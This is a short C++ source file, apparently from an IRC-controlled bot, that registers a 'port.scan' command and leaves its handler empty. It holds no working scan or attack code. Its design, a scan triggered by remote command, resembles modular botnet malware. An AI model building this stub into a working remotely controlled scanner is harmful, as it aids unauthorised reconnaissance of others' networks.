#include "main.h"
#include "mainctrl.h"
#include "portscan.h"
#include "irc.h"

void CPortScan::Init(){	
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdPScan, "port.scan", this);
}

bool CPortScan::HandleCommand(CMessage *pMsg){
	if(!pMsg->sCmd.Compare(m_cmdPScan.sName.Str()))
	{
		//portscan
	}
return true;}
